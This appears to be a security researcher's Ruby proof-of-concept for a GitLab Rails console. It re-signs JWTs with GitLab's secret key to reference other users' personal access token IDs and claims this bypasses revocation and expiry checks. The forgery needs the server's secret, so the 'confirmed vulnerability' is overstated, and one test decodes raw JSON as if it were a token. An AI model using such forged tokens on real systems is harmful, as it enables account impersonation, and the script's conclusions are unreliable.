# Test: JWT Token Manipulation Vulnerability
# Run this in your GitLab Rails console: rails console

puts "=== JWT Token Manipulation Test ==="
puts ""

# Test 1: Get a valid JWT token from GitLab
puts "1. Getting a valid JWT token from GitLab:"
begin
  # Find an existing token
  existing_token = PersonalAccessToken.first
  if existing_token
    puts "   Using token ID: #{existing_token.id}"
    
    # Create a legitimate JWT token
    payload = {
      'token' => existing_token.id,
      'iat' => Time.now.to_i,
      'exp' => Time.now.to_i + 300,
      'jti' => SecureRandom.uuid
    }
    
    original_jwt = JWT.encode(payload, Gitlab::JWTToken.secret, 'HS256')
    puts "   ✅ Original JWT created: #{original_jwt[0..50]}..."
    
    # Decode to verify it works
    decoded_original = Gitlab::JWTToken.decode(original_jwt)
    if decoded_original
      puts "   ✅ Original JWT decodes successfully"
      puts "   ✅ Token ID in original: #{decoded_original['token']}"
    else
      puts "   ❌ Original JWT decode failed"
    end
  else
    puts "   ❌ No existing tokens found"
    exit
  end
rescue => e
  puts "   ❌ Error creating original JWT: #{e.message}"
  exit
end
puts ""

# Test 2: Manual JWT manipulation
puts "2. Testing JWT manipulation without re-signing:"
begin
  # Decode the JWT to get the payload
  decoded_payload, header = JWT.decode(original_jwt, Gitlab::JWTToken.secret, true, algorithm: 'HS256')
  puts "   ✅ JWT decoded successfully"
  puts "   ✅ Original payload: #{decoded_payload}"
  
  # Create a new token ID to replace with
  new_token_id = existing_token.id + 1  # Try next ID
  puts "   🔄 Attempting to replace token ID: #{existing_token.id} -> #{new_token_id}"
  
  # Modify the payload
  modified_payload = decoded_payload.dup
  modified_payload['token'] = new_token_id
  puts "   ✅ Modified payload: #{modified_payload}"
  
  # Try to create new JWT without re-signing (this won't work)
  puts "   ⚠️  Note: JWT tokens are cryptographically signed"
  puts "   ⚠️  Modifying payload without re-signing will break the signature"
  
  # Try to decode the modified payload as if it were a valid JWT
  # This will fail because we haven't re-signed it
  begin
    # This would fail because the signature doesn't match the modified payload
    JWT.decode(modified_payload.to_json, Gitlab::JWTToken.secret, true, algorithm: 'HS256')
    puts "   ❌ Unexpected: Modified JWT decoded successfully (this shouldn't happen)"
  rescue JWT::DecodeError => e
    puts "   ✅ Expected: Modified JWT decode failed: #{e.message}"
  end
  
rescue => e
  puts "   ❌ Error in manipulation test: #{e.message}"
end
puts ""

# Test 3: Re-signing the modified payload
puts "3. Testing JWT manipulation with re-signing:"
begin
  # Create modified payload
  modified_payload = {
    'token' => new_token_id,
    'iat' => Time.now.to_i,
    'exp' => Time.now.to_i + 300,
    'jti' => SecureRandom.uuid
  }
  
  # Re-sign the modified payload
  modified_jwt = JWT.encode(modified_payload, Gitlab::JWTToken.secret, 'HS256')
  puts "   ✅ Modified JWT re-signed: #{modified_jwt[0..50]}..."
  
  # Test if the modified JWT decodes
  decoded_modified = Gitlab::JWTToken.decode(modified_jwt)
  if decoded_modified
    puts "   ✅ Modified JWT decodes successfully"
    puts "   ✅ New token ID in modified: #{decoded_modified['token']}"
  else
    puts "   ❌ Modified JWT decode failed"
  end
  
rescue => e
  puts "   ❌ Error in re-signing test: #{e.message}"
end
puts ""

# Test 4: Test the vulnerable code path with modified JWT
puts "4. Testing vulnerable code path with modified JWT:"
begin
  def test_vulnerable_resolution(jwt_token)
    begin
      # Step 1: Decode JWT
      jwt_payload = Gitlab::JWTToken.decode(jwt_token)
      return nil unless jwt_payload
      
      # Step 2: Check token ID type
      return nil unless jwt_payload['token'].is_a?(Integer)
      
      # Step 3: Find token by ID (VULNERABLE - no state validation)
      pat = PersonalAccessToken.find(jwt_payload['token'])
      return pat
    rescue => e
      puts "     ❌ Error: #{e.message}"
      return nil
    end
  end
  
  # Test with modified JWT
  result = test_vulnerable_resolution(modified_jwt)
  if result
    puts "   ✅ VULNERABILITY CONFIRMED!"
    puts "   ✅ Modified JWT works with new token ID!"
    puts "   ✅ Found token: #{result.id}"
    puts "   ✅ Token user: #{result.user.username}"
  else
    puts "   ❌ Modified JWT failed in vulnerable path"
  end
  
rescue => e
  puts "   ❌ Error testing vulnerable path: #{e.message}"
end
puts ""

# Test 5: Test with non-existent token ID
puts "5. Testing with non-existent token ID:"
begin
  # Try a very high token ID that likely doesn't exist
  fake_token_id = 999999
  
  fake_payload = {
    'token' => fake_token_id,
    'iat' => Time.now.to_i,
    'exp' => Time.now.to_i + 300,
    'jti' => SecureRandom.uuid
  }
  
  fake_jwt = JWT.encode(fake_payload, Gitlab::JWTToken.secret, 'HS256')
  puts "   ✅ Fake JWT created with token ID: #{fake_token_id}"
  
  # Test vulnerable path
  result = test_vulnerable_resolution(fake_jwt)
  if result
    puts "   ✅ Unexpected: Fake token ID worked!"
  else
    puts "   ✅ Expected: Fake token ID failed (token doesn't exist)"
  end
  
rescue => e
  puts "   ❌ Error testing fake token ID: #{e.message}"
end
puts ""

puts "=== ANALYSIS ==="
puts ""
puts "JWT Token Manipulation Results:"
puts ""
puts "❌ CANNOT manipulate JWT without re-signing:"
puts "   - JWT tokens are cryptographically signed"
puts "   - Modifying payload breaks the signature"
puts "   - GitLab validates the signature before processing"
puts ""
puts "✅ CAN manipulate JWT with re-signing:"
puts "   - Need access to GitLab's JWT secret key"
puts "   - Can replace token ID in payload"
puts "   - Re-sign with the same secret key"
puts "   - Modified JWT will be accepted by GitLab"
puts ""
puts "🔍 VULNERABILITY CONFIRMED:"
puts "   - If you have access to JWT secret key, you can create"
puts "   - JWT tokens with any token ID you want"
puts "   - This bypasses token revocation/expiration checks"
puts "   - No need for the original token value"
puts ""
puts "⚠️  REQUIREMENTS:"
puts "   - Access to GitLab's JWT secret key (via Rails console)"
puts "   - Knowledge of valid token IDs"
puts "   - Ability to create and sign JWT tokens"